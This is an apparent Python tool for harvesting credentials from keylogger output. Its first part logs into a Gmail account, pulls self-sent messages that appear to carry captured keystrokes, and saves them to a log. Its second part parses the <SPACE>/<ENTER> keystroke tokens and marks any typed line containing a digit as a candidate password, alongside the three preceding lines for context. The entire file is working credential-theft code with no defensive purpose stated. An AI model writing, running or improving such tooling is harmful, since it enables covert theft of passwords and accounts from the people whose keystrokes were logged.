# Extract Mail
import imaplib
import email
import re
import usernames

username = usernames.username
password = usernames.password

mail = imaplib.IMAP4_SSL("imap.gmail.com")
mail.login(username, password)

mail.select("inbox")

result, data = mail.uid('search', None, "ALL")

inbox_item = data[0].split()

for log in inbox_item:
    result2, email_data = mail.uid('fetch', log, '(RFC822)')
    raw_email = email_data[0][1].decode("utf-8")
    email_message = email.message_from_string(raw_email)
    from_ = email_message['From']
    if from_ == username:
        email_string = str(email_message)
        email_split = email_string.split("\n")
        with open("log.txt", "a") as f:
            f.write(str(email_split[11:-1]))


### PART II ###
# Create Key Parser
log_file = "log.txt"

trail = 3

numList = ['0','1', '2', '3', '4', '5', '6', '7', '8', '9']
with open (log_file, "r") as file:
    data = file.read()
    data = data[1:-1]
    data = data.replace("'", "").replace("[", "").replace("]", "").replace("<SPACE>", " ").split("<ENTER>")
    file.close()

possiblePW = {}
possiblePW_clean = {}
with open ("possiblePW.txt", "w") as f:   
    for i in range(len(data)):
        for char in data[i]:
            if char in numList:
                possiblePW[data[i]] = []
                for n in range(1,trail + 1):
                    (possiblePW[data[i]].append(data[i - n]))

    for k, v in possiblePW.items():
        v.reverse()
        f.writelines('%s:%s\n' % (k,v))
    f.close()